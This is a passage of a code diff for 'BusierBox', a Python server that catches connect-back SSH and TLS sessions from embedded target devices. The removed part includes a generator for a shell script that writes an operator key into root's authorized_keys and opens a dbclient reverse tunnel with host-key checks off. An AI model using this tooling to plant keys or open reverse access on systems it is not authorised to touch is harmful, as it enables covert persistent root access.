@@ -1,98 +1,69 @@
 #!/usr/bin/env python3
-"""BusierBox stager callback server."""
+"""BusierBox reverse access convenience server.
+
+This helper catches target-initiated reverse-access transports. It does not
+implement the retired BusierBox framed artifact-upload protocol.
+"""
 
 import argparse
 import base64
-import hashlib
 import json
 import os
 import select
 import socket
-import struct
-import subprocess
+import ssl
 import sys
-import textwrap
 import threading
 import time
-import traceback
 from pathlib import Path
 
 try:
     import paramiko
-    _HAVE_PARAMIKO = True
+    HAVE_PARAMIKO = True
 except ImportError:
-    _HAVE_PARAMIKO = False
+    HAVE_PARAMIKO = False
 
-PROTOCOL = "busierbox-stager-v1"
-MAX_FRAME = 1024 * 1024
-SESSION_ROOT = Path("local/sessions")
+
 DEFAULT_CONFIG = Path("local/server-config.json")
+DEFAULTS = {
+    "transport": "ssh",
+    "listen_host": "0.0.0.0",
+    "ssh_listen_port": 22202,
+    "socat_listen_port": 22203,
+    "forward_host": "127.0.0.1",
+    "forward_port": 2200,
+    "authorized_dbclient_pubkey": "local/operator-session/id_dbclient.pub",
+    "operator_host_key": "local/operator-session/operator_ssh_host_key",
+    "tls_cert": "local/operator-session/socat-server.crt",
+    "tls_key": "local/operator-session/socat-server.key",
+    "tls_verify": "no",
+    "session_root": "local/sessions",
+}
 
 
-# ── network helpers ────────────────────────────────────────────────────────────
-
-def parse_listen(value):
-    if ":" not in value:
-        raise argparse.ArgumentTypeError("expected HOST:PORT")
-    host, port = value.rsplit(":", 1)
-    return host, int(port)
-
-
-def load_server_config(path):
-    cfg_path = Path(path)
-    if not cfg_path.is_file():
-        return {}
-    try:
-        if cfg_path.suffix == ".json":
-            raw = json.loads(cfg_path.read_text(encoding="utf-8"))
-        else:
-            raw = {}
-            for line in cfg_path.read_text(encoding="utf-8").splitlines():
-                line = line.strip()
-                if not line or line.startswith("#") or "=" not in line:
-                    continue
-                key, _, val = line.partition("=")
-                raw[key.strip()] = val.strip().strip('"')
-    except (OSError, json.JSONDecodeError) as exc:
-        print(f"warning: unable to read server config {cfg_path}: {exc}", file=sys.stderr)
-        return {}
-
-    out = {}
-    keys = {
-        "token", "artifact", "remote_path", "send", "survey_only", "exec_doctor",
-        "exec_survey", "yes", "once", "timeout", "write_recommended_config",
-        "start_operator_session", "operator_server_host",
-        "operator_server_ssh_port", "operator_server_user",
-        "operator_remote_forward_port", "operator_target_dropbear_port",
-        "operator_target_bind_host", "operator_authorized_key_file",
-        "operator_dbclient_identity_file", "operator_known_hosts_policy",
-        "operator_wait_timeout", "no_operator_healthcheck",
-        "wait_operator_tunnel",
-    }
-    for key in keys:
-        if key in raw and raw[key] not in (None, ""):
-            out[key] = raw[key]
-    if "listen" in raw and raw["listen"]:
-        out["listen"] = parse_listen(str(raw["listen"]))
-    for key in (
-        "operator_server_ssh_port",
-        "operator_remote_forward_port",
-        "operator_target_dropbear_port",
-        "operator_wait_timeout",
-        "timeout",
-    ):
-        if key in out:
-            out[key] = int(out[key])
-    return out
+def load_config(path):
+    cfg = dict(DEFAULTS)
+    p = Path(path)
+    if p.is_file():
+        try:
+            data = json.loads(p.read_text(encoding="utf-8"))
+            for key, value in data.items():
+                if value not in (None, ""):
+                    cfg[key] = value
+        except (OSError, json.JSONDecodeError) as exc:
+            print(f"warning: unable to read {p}: {exc}", file=sys.stderr)
+    for key in ("ssh_listen_port", "socat_listen_port", "forward_port"):
+        cfg[key] = int(cfg[key])
+    return cfg
 
 
 def local_ips():
-    seen = set()
     ips = []
+    seen = set()
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            s.connect(("8.8.8.8", 80))
-            ips.append(s.getsockname()[0])
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.connect(("8.8.8.8", 80))
+            ips.append(sock.getsockname()[0])
     except OSError:
         pass
     try:
@@ -100,1301 +71,272 @@ def local_ips():
             ips.append(info[4][0])
     except OSError:
         pass
-    try:
-        out = subprocess.check_output(
-            ["ip", "-4", "-o", "addr", "show", "scope", "global"], text=True
-        )
-        for line in out.splitlines():
-            fields = line.split()
-            if len(fields) >= 4:
-                ips.append(fields[3].split("/", 1)[0])
-    except (OSError, subprocess.SubprocessError):
-        pass
-    result = []
+    out = []
     for ip in ips:
         if ip and not ip.startswith("127.") and ip not in seen:
             seen.add(ip)
-            result.append(ip)
-    return result
+            out.append(ip)
+    return out
 
 
-def sha256_file(path):
-    h = hashlib.sha256()
-    with open(path, "rb") as fp:
-        for chunk in iter(lambda: fp.read(1024 * 1024), b""):
-            h.update(chunk)
-    return h.hexdigest()
+def session_log_dir(cfg, transport):
+    root = Path(str(cfg["session_root"]))
+    path = root / (time.strftime("%Y%m%d-%H%M%S") + "-" + transport)
+    path.mkdir(parents=True, exist_ok=True)
+    return path
 
 
-def send_frame(conn, obj):
-    data = json.dumps(obj, separators=(",", ":")).encode()
-    if len(data) > MAX_FRAME:
-        raise RuntimeError("frame too large")
-    conn.sendall(struct.pack(">I", len(data)))
-    conn.sendall(data)
-
-
-def recv_exact(conn, n):
-    data = bytearray()
-    while len(data) < n:
-        chunk = conn.recv(n - len(data))
-        if not chunk:
-            raise EOFError("connection closed")
-        data.extend(chunk)
-    return bytes(data)
-
-
-def recv_frame(conn):
-    raw_len = recv_exact(conn, 4)
-    n = struct.unpack(">I", raw_len)[0]
-    if n == 0 or n > MAX_FRAME:
-        raise RuntimeError(f"invalid frame length {n}")
-    return json.loads(recv_exact(conn, n).decode())
-
-
-def ask(prompt, default=False):
-    suffix = " [Y/n] " if default else " [y/N] "
-    try:
-        ans = input(prompt + suffix).strip().lower()
-    except (EOFError, KeyboardInterrupt):
-        print()
-        return default
-    if not ans:
-        return default
-    return ans in ("y", "yes")
-
-
-# ── survey analysis ────────────────────────────────────────────────────────────
-
-def likely_tuple(survey):
-    rec = survey.get("recommendations") or {}
-    if rec.get("likely_tuple"):
-        return rec["likely_tuple"]
-    machine = survey.get("uname_machine", "")
-    endian = survey.get("endianness", "")
-    if "mips" in machine and endian == "little":
-        return "mipsel-linux-4.x-musl"
-    if "mips" in machine:
-        return "mips-linux-4.x-musl"
-    if "aarch64" in machine:
-        return "aarch64-linux-4.x-musl"
-    if "arm" in machine:
-        return "armv7-linux-3.x-musl"
-    return "unknown"
-
-
-def tuple_confidence(survey):
-    machine = survey.get("uname_machine", "")
-    endian = survey.get("endianness", "")
-    release = survey.get("uname_release", "")
-    tup = likely_tuple(survey)
-    if tup == "unknown":
-        return "low", "unknown architecture"
-    note = f"inferred from {machine} + {endian} endian"
-    if "openwrt" in release.lower() or "5.10" in release or "4." in release:
-        return "medium", note + " + OpenWrt-like kernel"
-    return "medium", note
-
-
-def sorted_dirs(survey):
-    dirs = survey.get("dirs") or []
-    ok = [d for d in dirs if d.get("writable") and d.get("executable")]
-    ok.sort(key=lambda d: d.get("free_bytes") or 0, reverse=True)
-    return ok
-
-
-def best_dir(survey):
-    for item in (survey.get("dirs") or []):
-        if item.get("writable") and item.get("executable"):
-            return item
-    return {}
-
-
-def summarize_survey(addr, hello):
-    survey = hello.get("survey") or {}
-    machine = survey.get("uname_machine", "unknown")
-    endian = survey.get("endianness", "unknown")
-    width = survey.get("pointer_width", 0)
-    kernel = survey.get("uname_release", "unknown")
-    uid = survey.get("uid", "?")
-    euid = survey.get("euid", "?")
-    rec = survey.get("recommendations") or {}
-    payload_possible = bool(rec.get("payload_mode_possible"))
-    tup = likely_tuple(survey)
-    confidence, conf_note = tuple_confidence(survey)
-    stager_version = hello.get("stager_version", "?")
-
-    arch_str = f"{machine} {endian}-endian"
-    if width:
-        arch_str += f", {width}-bit"
-
-    print("\nTarget summary:")
-    print(f"  remote:        {addr[0]}:{addr[1]}")
-    print(f"  stager:        {stager_version}")
-    print(f"  arch:          {arch_str}")
-    print(f"  kernel:        Linux {kernel}")
-    print(f"  uid/euid:      {uid}/{euid}")
-
-    dirs = sorted_dirs(survey)
-    if dirs:
-        best = dirs[0]
-        mib = int(best.get("free_bytes") or 0) // (1024 * 1024)
-        print(f"  best exec dir: {best.get('path')} ({mib} MiB free)")
-
-    devpts = survey.get("devpts_exists", False) or survey.get("devpts_available", False)
-    print(f"  devpts:        {'yes' if devpts else 'no'}")
-    ptrace = survey.get("ptrace", "unknown")
-    print(f"  ptrace:        {ptrace}")
-    print(f"  full payload:  {'yes' if payload_possible else 'no'}")
-    print(f"  likely tuple:  {tup}")
-    print(f"  confidence:    {confidence}; {conf_note}")
-
-    ifaces = survey.get("interfaces") or []
-    if ifaces:
-        print("  interfaces:    " + ", ".join(str(i) for i in ifaces))
-
-
-def build_summary_text(addr, hello):
-    survey = hello.get("survey") or {}
-    machine = survey.get("uname_machine", "unknown")
-    endian = survey.get("endianness", "unknown")
-    width = survey.get("pointer_width", 0)
-    kernel = survey.get("uname_release", "unknown")
-    uid = survey.get("uid", "?")
-    euid = survey.get("euid", "?")
-    rec = survey.get("recommendations") or {}
-    payload_possible = bool(rec.get("payload_mode_possible"))
-    tup = likely_tuple(survey)
-    confidence, conf_note = tuple_confidence(survey)
-    stager_version = hello.get("stager_version", "?")
-
-    arch_str = f"{machine} {endian}-endian"
-    if width:
-        arch_str += f", {width}-bit"
-
-    lines = [
-        f"remote:        {addr[0]}:{addr[1]}",
-        f"stager:        {stager_version}",
-        f"arch:          {arch_str}",
-        f"kernel:        Linux {kernel}",
-        f"uid/euid:      {uid}/{euid}",
-        f"full payload:  {'yes' if payload_possible else 'no'}",
-        f"likely tuple:  {tup}",
-        f"confidence:    {confidence}; {conf_note}",
-    ]
-    dirs = sorted_dirs(survey)
-    if dirs:
-        best = dirs[0]
-        mib = int(best.get("free_bytes") or 0) // (1024 * 1024)
-        lines.append(f"best exec dir: {best.get('path')} ({mib} MiB free)")
-    return "\n".join(lines) + "\n"
-
-
-# ── recommended config ─────────────────────────────────────────────────────────
-
-def build_recommended_config(hello):
-    survey = hello.get("survey") or {}
-    tup = likely_tuple(survey)
-    machine = survey.get("uname_machine", "unknown")
-    endian = survey.get("endianness", "unknown")
-    kernel = survey.get("uname_release", "unknown")
-    confidence, conf_note = tuple_confidence(survey)
-
-    if tup.startswith("mipsel"):
-        arch, preset, libc, kfloor = "mipsel", "glinet-mt7621-openwrt-musl", "musl", "4.x"
-    elif tup.startswith("mips-"):
-        arch, preset, libc, kfloor = "mips", tup, "musl", "4.x"
-    elif tup.startswith("aarch64"):
-        arch, preset, libc, kfloor = "aarch64", tup, "musl", "4.x"
-    elif tup.startswith("armv7"):
-        arch, preset, libc, kfloor = "armv7", tup, "musl", "3.x"
-    elif tup.startswith("x86_64"):
-        arch, preset, libc, kfloor = "x86_64", tup, "musl", "current"
+def print_candidates(cfg, port):
+    print(f"Listening on {cfg['listen_host']}:{port}")
+    candidates = local_ips()
+    if candidates:
+        print("Candidate target connect-back hosts:")
+        for ip in candidates:
+            print(f"  {ip}:{port}")
     else:
-        arch, preset, libc, kfloor = machine, tup, "musl", "4.x"
-
-    lines = [
-        "# Generated by scripts/busierbox-server from stager survey",
-        f"# Survey: {machine} {endian}-endian, kernel {kernel}",
-        f"# Confidence: {confidence} — {conf_note}",
-        "",
-        f'BB_TARGET_PRESET="{preset}"',
-        f'BB_TARGET_ARCH="{arch}"',
-        f'BB_TARGET_ENDIAN="{endian}"',
-        f'BB_TARGET_LIBC="{libc}"',
-        f'BB_KERNEL_FLOOR="{kfloor}"',
-        'BB_PAYLOAD_TIER="operator"',
-        "",
-    ]
-    return "\n".join(lines)
+        print("Candidate target connect-back hosts: unable to infer local IPs")
 
 
-def write_recommended_config(path, hello):
-    Path(path).write_text(build_recommended_config(hello), encoding="utf-8")
-    print(f"Recommended config: {path}")
-
-
-# ── doctor output parsing ──────────────────────────────────────────────────────
-
-def parse_doctor_kv(text):
-    """Parse key=value lines from doctor output into a dict."""
-    kv = {}
-    for line in text.splitlines():
-        line = line.strip()
-        if not line or "=" not in line:
+def load_public_key(path):
+    if not HAVE_PARAMIKO:
+        return None
+    key_path = Path(path).expanduser()
+    if not key_path.is_file():
+        raise RuntimeError(f"authorized dbclient public key not found: {key_path}")
+    text = key_path.read_text(encoding="utf-8").strip()
+    key_type, key_data = text.split()[:2]
+    blob = base64.b64decode(key_data.encode("ascii"))
+    for cls in (paramiko.RSAKey, paramiko.ECDSAKey, paramiko.Ed25519Key):
+        try:
+            return cls(data=blob)
+        except Exception:
             continue
-        key, _, val = line.partition("=")
-        kv[key.strip()] = val.strip()
-    return kv
+    raise RuntimeError(f"unsupported public key: {key_path}")
 
 
-def parse_list_field(val):
-    """Parse [a,b,c] format into a list."""
-    val = (val or "").strip()
-    if not val or val == "[]":
-        return []
-    if val.startswith("[") and val.endswith("]"):
-        inner = val[1:-1].strip()
-        if not inner:
-            return []
-        return [x.strip() for x in inner.split(",") if x.strip()]
-    return []
-
-
-def parse_dict_field(val):
-    """Parse {k=v,k2=v2} format into a dict."""
-    val = (val or "").strip()
-    if not val or val == "{}":
-        return {}
-    if val.startswith("{") and val.endswith("}"):
-        result = {}
-        for item in val[1:-1].split(","):
-            if "=" in item:
-                k, _, v = item.partition("=")
-                result[k.strip()] = v.strip()
-        return result
-    return {}
-
-
-def print_doctor_summary(kv):
-    """Pretty-print parsed doctor output. Returns list of staged tools."""
-    print("\nFull artifact doctor:")
-
-    embedded = kv.get("embedded_payload", "?")
-    fmt = kv.get("embedded_format", "")
-    size_bytes = kv.get("embedded_size", "")
-    hash_ok = kv.get("embedded_hash_ok", "?")
-    size_str = ""
-    if size_bytes:
-        try:
-            mib = int(size_bytes) / (1024 * 1024)
-            size_str = f" {mib:.1f} MiB"
-        except (ValueError, TypeError):
-            pass
-    print(f"  embedded payload:  {embedded} {fmt}{size_str} hash {'ok' if hash_ok == 'yes' else hash_ok}")
-
-    extracted = kv.get("extracted_payload", "?")
-    print(f"  extracted payload: {extracted}")
-
-    identity = kv.get("payload_identity_match", "?")
-    print(f"  payload identity:  {'ok' if identity == 'yes' else identity}")
-
-    applets_count = kv.get("busybox_applets_count", "?")
-    print(f"  BusyBox applets:   {applets_count}")
-
-    staged = parse_list_field(kv.get("staged_tools", "[]"))
-    if staged:
-        wrapped = textwrap.fill(", ".join(staged), width=68,
-                                initial_indent="    ", subsequent_indent="    ")
-        print("  staged tools:")
-        print(wrapped)
-    else:
-        print("  staged tools:      (none)")
-
-    missing = parse_list_field(kv.get("missing_tools", "[]"))
-    reasons = parse_dict_field(kv.get("missing_tool_reasons", "{}"))
-    if missing:
-        print("  missing tools:")
-        for tool in missing:
-            reason = reasons.get(tool, "no provider")
-            print(f"    {tool} — {reason}")
-    else:
-        print("  missing tools:     (none)")
-
-    overlay_enabled = kv.get("overlay_enabled", "?")
-    overlay_tools = parse_list_field(kv.get("overlay_tools", "[]"))
-    overlay_str = f"enabled={overlay_enabled}"
-    if overlay_tools:
-        overlay_str += f", tools: {', '.join(overlay_tools)}"
-    else:
-        overlay_str += ", no overlay tools staged"
-    print(f"  overlay:           {overlay_str}")
-
-    tier = kv.get("artifact_tier", "?")
-    version = kv.get("embedded_version", "?")
-    print(f"  artifact:          tier={tier} version={version}")
-
-    return staged
-
-
-# ── session logging ────────────────────────────────────────────────────────────
-
-def log_event(logfp, event):
-    ev = dict(event)
-    ev["ts"] = time.time()
-    logfp.write(json.dumps(ev, sort_keys=True) + "\n")
-    logfp.flush()
-
-
-def make_session_dir():
-    base = time.strftime("%Y%m%d-%H%M%S")
-    session_dir = SESSION_ROOT / base
-    n = 0
-    while session_dir.exists():
-        n += 1
-        session_dir = SESSION_ROOT / f"{base}-{n}"
-    session_dir.mkdir(parents=True, exist_ok=True)
-    return session_dir
-
-
-# ── send_bytes helper ──────────────────────────────────────────────────────────
-
-def send_bytes(conn, logfp, data, remote_path, mode, label):
-    """Send raw bytes to the target as a named file. Returns result frame."""
-    sha = hashlib.sha256(data).hexdigest()
-    send_frame(conn, {
-        "type": "send_file",
-        "path": remote_path,
-        "mode": mode,
-        "size": len(data),
-        "sha256": sha,
-    })
-    conn.sendall(data)
-    result = recv_frame(conn)
-    log_event(logfp, {"event": "send_file_result", "label": label, "result": result})
-    return result
-
-
-# ── operator session ───────────────────────────────────────────────────────────
-
-def build_operator_session_script(args, extract_dir):
-    """Generate a self-contained shell script for the reverse SSH operator session.
-
-    Auth model:
-      target → server  (dbclient): private key staged to payload/home/.ssh/id_dbclient
-      operator → target (dropbear): public key embedded here, written to authorized_keys
-    """
-    target_port = args.operator_target_dropbear_port
-    target_bind = args.operator_target_bind_host
-    server_host = args.operator_server_host
-    server_ssh_port = args.operator_server_ssh_port
-    server_user = args.operator_server_user
-    fwd_port = args.operator_remote_forward_port
-    policy = getattr(args, "operator_known_hosts_policy", "off")
-
-    payload_bin = f"{extract_dir}/payload/bin"
-    payload_etc = f"{extract_dir}/payload/etc/dropbear"
-    payload_home = f"{extract_dir}/payload/home"
-    identity = f"{payload_home}/.ssh/id_dbclient"
-    hostkey = f"{payload_etc}/dropbear_rsa_host_key"
-
-    # off / accept-new → -y (dbclient accepts any host key)
-    # strict           → no -y (dbclient checks known_hosts)
-    accept_any = policy in ("off", "accept-new")
-
-    auth_key_lines = ""
-    auth_key_path = getattr(args, "operator_authorized_key_file", None)
-    if auth_key_path:
-        try:
-            auth_key_lines = Path(auth_key_path).read_text(encoding="utf-8").strip()
-        except OSError:
-            pass
-
-    lines = [
-        "#!/bin/sh",
-        "# BusierBox operator session — generated by busierbox-server, do not edit.",
-        "set -eu",
-        "",
-        f"EXTRACT_DIR='{extract_dir}'",
-        f"PAYLOAD_BIN='{payload_bin}'",
-        f"PAYLOAD_ETC='{payload_etc}'",
-        f"PAYLOAD_HOME='{payload_home}'",
-        f"IDENTITY='{identity}'",
-        f"HOSTKEY='{hostkey}'",
-        "",
-        'mkdir -p "$PAYLOAD_ETC" "$PAYLOAD_HOME/.ssh"',
-        'chmod 700 "$PAYLOAD_HOME/.ssh" 2>/dev/null || true',
-        "",
-    ]
-
-    if auth_key_lines:
-        # Embed the public key so operator can SSH in through the tunnel.
-        # Dropbear looks up authorized_keys via getpwuid(uid).pw_dir; for root
-        # that is /root.  We write there AND to the payload home as a fallback.
-        lines += [
-            "# Stage authorized_keys for operator → target authentication",
-            'mkdir -p /root/.ssh 2>/dev/null || true',
-            "cat >> /root/.ssh/authorized_keys << 'BBXAUTHEOF'",
-            auth_key_lines,
-            "BBXAUTHEOF",
-            'chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true',
-            "# Also write to payload home (fallback if home != /root)",
-            "cat >> \"$PAYLOAD_HOME/.ssh/authorized_keys\" << 'BBXAUTHEOF2'",
-            auth_key_lines,
-            "BBXAUTHEOF2",
-            'chmod 600 "$PAYLOAD_HOME/.ssh/authorized_keys" 2>/dev/null || true',
-            "",
-        ]
-
-    lines += [
-        "# Ensure identity key has correct permissions (staged separately)",
-        'chmod 600 "$IDENTITY" 2>/dev/null || true',
-        "",
-        "# Generate Dropbear RSA host key if not already present",
-        'if [ ! -f "$HOSTKEY" ]; then',
-        '    "$PAYLOAD_BIN/dropbearkey" -t rsa -f "$HOSTKEY" >/dev/null 2>&1',
-        "fi",
-        "",
-        "# Start Dropbear SSH server bound to loopback",
-        '"$PAYLOAD_BIN/dropbear" \\',
-        '    -r "$HOSTKEY" \\',
-        f"    -p {target_bind}:{target_port} \\",
-        "    -F -E >/tmp/dropbear-bbx.log 2>&1 &",
-        "DROPBEAR_PID=$!",
-        'echo "dropbear_pid=$DROPBEAR_PID"',
-        "sleep 1",
-        "",
-        "# Start dbclient reverse-port-forward to operator server",
-        '"$PAYLOAD_BIN/dbclient" \\',
-        '    -i "$IDENTITY" \\',
-    ]
-    if accept_any:
-        lines.append("    -y \\")
-    lines += [
-        "    -K 30 \\",
-        "    -N \\",
-        f"    -R 127.0.0.1:{fwd_port}:{target_bind}:{target_port} \\",
-        f"    {server_user}@{server_host} -p {server_ssh_port} \\",
-        "    >/tmp/dbclient-bbx.log 2>&1 &",
-        "DBCLIENT_PID=$!",
-        'echo "dbclient_pid=$DBCLIENT_PID"',
-        'echo "operator-session-started"',
-    ]
-    return "\n".join(lines) + "\n"
-
-
-def _validate_operator_session_auth(args):
-    """Validate auth file prerequisites. Returns list of error strings."""
-    errors = []
-    if not args.operator_server_host:
-        errors.append("--operator-server-host not set")
-    identity = getattr(args, "operator_dbclient_identity_file", None)
-    if not identity:
-        errors.append("--operator-dbclient-identity-file not set")
-    elif not Path(identity).is_file():
-        errors.append(f"--operator-dbclient-identity-file not found: {identity}")
-    auth_key = getattr(args, "operator_authorized_key_file", None)
-    if not auth_key:
-        errors.append("--operator-authorized-key-file not set")
-    elif not Path(auth_key).is_file():
-        errors.append(f"--operator-authorized-key-file not found: {auth_key}")
-    return errors
-
-
-def _load_operator_pubkey(pub_path):
-    """Parse an OpenSSH public key file into a paramiko key object."""
-    line = Path(pub_path).read_text(encoding="utf-8").strip().splitlines()[0]
-    parts = line.split()
-    if len(parts) < 2:
-        raise ValueError(f"Cannot parse public key from {pub_path}")
-    key_type, key_b64 = parts[0], parts[1]
-    raw = base64.b64decode(key_b64)
-    if "rsa" in key_type:
-        return paramiko.RSAKey(data=raw)
-    if "ecdsa" in key_type:
-        return paramiko.ECDSAKey(data=raw)
-    if "ed25519" in key_type:
-        return paramiko.Ed25519Key(data=raw)
-    raise ValueError(f"Unsupported key type: {key_type}")
-
-
-def _ensure_operator_host_key(path):
-    """Return a persistent RSA host key for the operator SSH server, generating if absent."""
-    p = Path(path)
-    if p.exists():
-        return paramiko.RSAKey(filename=str(p))
-    key = paramiko.RSAKey.generate(2048)
-    p.parent.mkdir(parents=True, exist_ok=True)
-    key.write_private_key_file(str(p))
+def ensure_host_key(path):
+    if not HAVE_PARAMIKO:
+        return None
+    key_path = Path(path).expanduser()
+    key_path.parent.mkdir(parents=True, exist_ok=True)
+    if key_path.is_file():
+        return paramiko.RSAKey(filename=str(key_path))
+    key = paramiko.RSAKey.generate(3072)
+    key.write_private_key_file(str(key_path))
     return key
 
 
-def _relay_channel_socket(chan, sock):
-    """Relay data between a paramiko channel and a plain socket until either closes."""
-    chan.settimeout(0.0)
-    sock.setblocking(False)
-    try:
-        while True:
-            r, _, _ = select.select([chan, sock], [], [], 1.0)
-            if chan in r:
-                data = chan.recv(4096)
-                if not data:
-                    break
-                sock.sendall(data)
-            if sock in r:
-                data = sock.recv(4096)
-                if not data:
-                    break
-                chan.sendall(data)
-    except Exception:
-        pass
-    finally:
-        try:
-            chan.close()
-        except Exception:
-            pass
-        try:
-            sock.close()
-        except Exception:
-            pass
+class ReverseSSHServer(paramiko.ServerInterface if HAVE_PARAMIKO else object):
+    def __init__(self, authorized_key, forward_host, forward_port):
+        self.authorized_key = authorized_key
+        self.forward_host = forward_host
+        self.forward_port = forward_port
+        self.forward_requests = []
+        self.transport = None
+        self.listener = None
 
-
-class _KexGuess2CompatTransport(paramiko.Transport):
-    """
-    Paramiko Transport subclass that properly handles Dropbear's kexguess2.
-
-    Dropbear 2025.89 advertises kexguess2@matt.ucc.asn.au and sets kex_follows=True
-    in its KEXINIT, meaning it speculatively sends its preferred-algorithm kex init
-    packet immediately. If the agreed algorithm differs from the client's first choice,
-    that speculative packet must be silently discarded per the kexguess2 spec.
-    Paramiko ignores kex_follows=True entirely, so we intercept it here.
-    """
-
-    def _really_parse_kex_init(self, m, ignore_first_byte=False):
-        parsed = super()._really_parse_kex_init(m, ignore_first_byte=ignore_first_byte)
-        # Stash kex_follows and the client's first real kex algorithm.
-        # Strip non-algorithm tokens (kexguess2, ext-info, kex-strict markers).
-        real_algos = [
-            a for a in parsed.get("kex_algo_list", [])
-            if not a.startswith("kexguess2") and not a.startswith("ext-info")
-            and not a.startswith("kex-strict")
-        ]
-        self._kexguess2_follows = parsed.get("kex_follows", False)
-        self._kexguess2_client_first = real_algos[0] if real_algos else None
-        return parsed
-
-    def _parse_kex_init(self, m):
-        super()._parse_kex_init(m)
-        # After parent sets kex_engine: if client sent kex_follows=True and its first
-        # algorithm differs from what we negotiated, wrap parse_next to silently
-        # discard the one speculative packet already in flight.
-        if not (self._kexguess2_follows and self.server_mode):
-            return
-        agreed = getattr(self.kex_engine, "name", None)
-        if agreed == self._kexguess2_client_first:
-            return  # guess was correct; no discard needed
-        _original = self.kex_engine.parse_next
-        _skipped = [False]
-
-        def _skip_once(ptype, msg):
-            if not _skipped[0]:
-                _skipped[0] = True
-                self._expect_packet(ptype)  # re-arm for the real kex init
-                return
-            return _original(ptype, msg)
-
-        self.kex_engine.parse_next = _skip_once
-
-
-class _TcpForwardServerInterface(paramiko.ServerInterface):
-    """Minimal paramiko server interface: publickey auth + tcpip-forward only."""
-
-    def __init__(self, authorized_key):
-        self._auth_key = authorized_key
-        self.forward_event = threading.Event()
-        self.forward_addr = "127.0.0.1"
-        self.forward_port = None
-
-    def check_channel_request(self, kind, chanid):
-        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+    def set_transport(self, transport):
+        self.transport = transport
 
     def check_auth_publickey(self, username, key):
-        if (self._auth_key
-                and key.get_name() == self._auth_key.get_name()
-                and key.get_base64() == self._auth_key.get_base64()):
+        if self.authorized_key and key == self.authorized_key:
+            print(f"SSH auth OK for {username}")
             return paramiko.AUTH_SUCCESSFUL
+        print(f"SSH auth rejected for {username}")
         return paramiko.AUTH_FAILED
 
     def get_allowed_auths(self, username):
         return "publickey"
 
     def check_port_forward_request(self, address, port):
-        # paramiko calls this (not check_global_request) for tcpip-forward
-        self.forward_addr = address or "127.0.0.1"
-        self.forward_port = port
-        self.forward_event.set()
-        return port  # return the port we'll listen on
+        requested = int(port)
+        if requested != int(self.forward_port):
+            print(f"reject remote forward {address}:{port}; expected port {self.forward_port}")
+            return False
+        self.forward_requests.append((address, requested))
+        self.start_forward_listener()
+        print(f"Reverse SSH forward active: {address}:{requested}")
+        print(f"Connect with: ssh -p {requested} root@127.0.0.1")
+        return requested
 
+    def check_channel_direct_tcpip_request(self, chanid, origin, destination):
+        return paramiko.OPEN_SUCCEEDED
 
-class OperatorSSHServer:
-    """
-    Ephemeral SSH server that accepts a reverse port forward from the target's dbclient.
+    def start_forward_listener(self):
+        if self.listener is not None:
+            return
 
-    Starts listening immediately on bind_port. When dbclient connects and establishes
-    its tcpip-forward (-R), self.tunnel_event is set and localhost:forward_port will
-    accept connections that are relayed through the SSH channel to the target's dropbear.
-    """
-
-    def __init__(self, bind_port, host_key_path, pubkey_path, forward_port):
-        self.bind_port = bind_port
-        self.forward_port = forward_port
-        self.tunnel_event = threading.Event()
-        self._transport = None
-        self._error = None
-
-        host_key = _ensure_operator_host_key(host_key_path)
-        auth_key = _load_operator_pubkey(pubkey_path)
-
-        self._srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self._srv_sock.bind(("0.0.0.0", bind_port))
-        self._srv_sock.listen(1)
-
-        self._thread = threading.Thread(
-            target=self._run, args=(host_key, auth_key), daemon=True, name="operator-ssh"
-        )
-        self._thread.start()
-
-    def _run(self, host_key, auth_key):
-        try:
-            self._srv_sock.settimeout(None)
-            client_sock, client_addr = self._srv_sock.accept()
-            self._srv_sock.close()
-            print(f"  dbclient connected from {client_addr[0]}:{client_addr[1]}")
-
-            # Disable all kex except group14: EC/curve25519 kex trips paramiko bugs,
-            # and group1 "e out of range" would fire if sntrup761 kexguess2 packet
-            # slips through (see _KexGuess2CompatTransport for that fix).
-            _keep_kex = {"diffie-hellman-group14-sha256", "diffie-hellman-group14-sha1"}
-            _bad_kex = [k for k in paramiko.Transport._preferred_kex if k not in _keep_kex]
-            transport = _KexGuess2CompatTransport(
-                client_sock,
-                disabled_algorithms={"kex": _bad_kex},
-            )
-            print(f"  kex advertised: {list(transport.preferred_kex)}", flush=True)
-            transport.add_server_key(host_key)
-            iface = _TcpForwardServerInterface(auth_key)
-            transport.start_server(server=iface)
-
-            if not iface.forward_event.wait(timeout=30):
-                transport.close()
-                self._error = "dbclient connected but sent no tcpip-forward request"
-                self.tunnel_event.set()
-                return
-
-            self._transport = transport
-            self._start_forward_listener(transport, iface.forward_port)
-            self.tunnel_event.set()
-        except Exception as exc:
-            self._error = str(exc)
-            self.tunnel_event.set()
-
-    def _start_forward_listener(self, transport, ssh_forward_port):
-        fwd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        fwd_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        fwd_sock.bind(("127.0.0.1", self.forward_port))
-        fwd_sock.listen(5)
-
-        def _accept_loop():
-            while transport.is_active():
-                try:
-                    fwd_sock.settimeout(1.0)
-                    conn, conn_addr = fwd_sock.accept()
-                except socket.timeout:
-                    continue
-                except OSError:
-                    break
-                try:
-                    chan = transport.open_channel(
-                        "forwarded-tcpip",
-                        dest_addr=("127.0.0.1", ssh_forward_port),
-                        src_addr=conn_addr,
-                    )
-                    if chan is None:
-                        conn.close()
+        def run():
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.bind((str(self.forward_host), int(self.forward_port)))
+                sock.listen(20)
+                self.listener = sock
+                while self.transport and self.transport.is_active():
+                    try:
+                        local, origin = sock.accept()
+                    except OSError:
+                        break
+                    try:
+                        chan = self.transport.open_forwarded_tcpip_channel(
+                            (str(self.forward_host), int(self.forward_port)),
+                            origin,
+                        )
+                    except Exception as exc:
+                        print(f"forward channel failed: {exc}", file=sys.stderr)
+                        local.close()
                         continue
-                    threading.Thread(
-                        target=_relay_channel_socket, args=(chan, conn), daemon=True
-                    ).start()
-                except Exception as exc:
